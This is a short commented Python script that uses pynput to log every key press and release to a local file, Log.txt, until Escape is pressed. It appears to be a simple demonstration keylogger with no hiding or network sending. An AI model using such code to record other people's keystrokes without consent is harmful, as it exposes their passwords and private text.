import pynput
from pynput import keyboard

#call to start the keylogger
def startLog():
    #define the file that the keylogger will write the logged keys to
    with open("Log.txt", 'a') as file:
        file.write("Logging started\n")
        #record key press in log file
        def on_press(key):
            #print("{0} pressed".format(key))
            file.write("{} pressed\n".format(key))

        #record key release in log file
        def on_release(key):
            #print("{0} released".format(key))
            file.write("{} released\n".format(key))

            #if the key released was the Escape key, return false to stop the listener and close/save the log file
            if key == keyboard.Key.esc:
                file.write("Logging ended with {}\n".format(key))
                file.close()
                return False

        # collect the key input until it is released
        with keyboard.Listener(
            on_press=on_press,
            on_release=on_release
        )  as listener:
            listener.join()